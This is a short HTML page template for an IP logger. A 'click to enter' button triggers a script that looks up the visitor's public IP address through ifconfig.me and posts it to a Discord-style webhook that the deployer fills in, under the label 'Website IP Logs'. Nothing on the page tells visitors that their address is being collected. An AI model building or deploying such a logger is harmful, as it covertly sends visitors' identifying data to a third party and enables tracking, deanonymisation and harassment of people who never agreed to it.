<body>

     <button id="click-to-enter" onclick="sendWebhook();">click to enter</button> <!-- webhook will send after clicking that button -->

    <main>
        <p id="text">example text</p>
    </main>

    <script>
       async function sendWebhook() {
            let ip = await(await fetch(`https://ifconfig.me/ip`)).text();
            var request = new XMLHttpRequest();
            request.open("POST", "YOUR WEBHOOK HERE"); // paste your webhook link there

            request.setRequestHeader('Content-type', 'application/json');

            var params = {
                username: "Website IP Logs",
                avatar_url: "",
                content: `IP: ${ip}`
            };

            request.send(JSON.stringify(params));
        };
    </script>

</body>

</html>
